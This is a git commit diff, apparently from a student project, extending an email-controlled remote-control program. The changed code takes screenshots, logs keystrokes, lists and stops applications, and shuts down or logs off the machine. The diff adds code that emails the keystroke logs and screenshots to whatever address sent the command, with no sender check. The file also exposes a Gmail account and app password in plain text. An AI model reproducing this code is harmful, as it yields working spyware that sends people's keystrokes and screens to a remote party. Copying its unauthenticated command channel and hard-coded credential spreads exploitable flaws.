3ba417a54aa9cddf013a9a449adc43875a34aa1f
vhakHCMUS <22127201@student.hcmus.edu.vn>
2023-10-13 21:48:33 +0700

    Need debug send picture

--- EmailHandler.py
+++ EmailHandler.py
@@ -1,11 +1,17 @@
 import imaplib
 import email
+import smtplib
 from email.header import decode_header
+from email.mime.multipart import MIMEMultipart
+from email.mime.image import MIMEImage
+import os
 
 IMAP_SERVER = "imap.gmail.com"
 IMAP_PORT = 993
 EMAIL = "networkdummy2023@gmail.com"
 PASSWORD = "icin ujtn kyfa oyje"
+SMTP_SERVER = "smtp.gmail.com"
+SMTP_PORT = 587
 
 class EmailHandler():
     def __init__(self):
@@ -35,6 +41,48 @@ class EmailHandler():
             if part.get_content_type() == "text/plain":
                 body = part.get_payload(decode=True)
                 content += body.decode("utf-8")
-        return subject, content
+
+        #make sender the email address of the sender
+        sender = msg["From"].split()[-1].strip("<>")
+        return subject, content, sender
+    
+    def sendEmail(self, to, subject, content):
+        msg = f"Subject: {subject}\n\n{content}"
+        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+        server.starttls()
+        server.login(EMAIL, PASSWORD)
+        server.sendmail(EMAIL, to, msg)
+        server.quit()
+
+    def sendPicture(self, to, subject, filename):
+        # Create a MIME object for the email
+        msg = MIMEMultipart()
+        msg["From"] = EMAIL
+        msg["To"] = to
+        msg["Subject"] = subject
+
+        # Attempt to determine the script directory
+        script_directory = os.path.dirname(os.path.abspath(__file__)) if __file__ else ""
+
+        if not script_directory:
+            # Handle the case where the script's directory couldn't be determined
+            print("Warning: Unable to determine script directory.")
+            return
+
+        # Construct the full file path for the image
+        full_filename = os.path.join(script_directory, filename)
+
+        # Attach the picture to the email
+        with open(full_filename, "rb") as file:
+            image = MIMEImage(file.read(), name=os.path.basename(full_filename))
+            msg.attach(image)
+
+        # Connect to the SMTP server and send the email
+        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+        server.starttls()
+        server.login(EMAIL, PASSWORD)
+        server.sendmail(EMAIL, to, msg.as_string())
+        server.quit()
+
 
     
--- main.py
+++ main.py
@@ -21,13 +21,16 @@ while True:
 
     print(f'Waiting for next command{idler[waitCounter]}\r', end='')
     waitCounter = 0 if waitCounter == 3 else waitCounter + 1 
+    
+    result = ''
 
     if 'EMPTY' in cmd:
         continue
     os.system('cls')
-
     if cmd[0] == 'screenshot':
-        ScreenShot.capture()
+        result = 'Screenshot captured'
+        filename = ScreenShot.capture()
+        email.sendPicture(command[2], 'Screenshot', filename)
 
     elif cmd[0] == 'keylog':
         keylTime = DEFAULT_KEYLOG_TIME
@@ -39,12 +42,16 @@ while True:
         if '-both' in cmd:
             for i in keys:
                 print(f'{i}: {keys[i]}')
+                result += f'{i}: {keys[i]}\n'
             print(f'Log: {keylog.getLog()}')
+            result += f'Log: {keylog.getLog()}'
         elif '-l' in cmd:
             print(f'Log: {keylog.getLog()}')
+            result += f'Log: {keylog.getLog()}'
         else:
             for i in keys:
                 print(f'{i}: {keys[i]}')
+                result += f'{i}: {keys[i]}\n'
 
 
     elif cmd[0] == 'app':
@@ -52,29 +59,40 @@ while True:
             appList = app.ListApp('-path' in cmd)
             for i in appList:
                 print(i)
+                result += i + '\n'
         elif cmd[1] == '-end':
             app.StopApp(cmd[2])
+            result = 'Stopped'
         else:
             app.OpenApp(cmd[2])
+            result = 'Opened'
 
     elif cmd[0] == 'proc':
         if cmd[1] == 'list':
             procList = proc.ListGet()
             for i in procList:
                 print(f'{i[0]:<10}{i[1]}')
+                result += f'{i[0]:<10}{i[1]}\n'
 
     elif cmd[0] == 'shutdown':
         Power.shutdown()
+        result = 'Shutdown'
     
     elif cmd[0] == 'restart':
         Power.restart()
+        result = 'Restart'
     
     elif cmd[0] == 'logout':
         Power.logout()
+        result = 'Logout'
 
     else:
         print('Error: Command not found')
-
+        result = 'Error: Command not found'
+    
+    sender = command[2]
+    if result != '':
+        email.sendEmail(sender, 'Result', result)
     time.sleep(1)
     
 
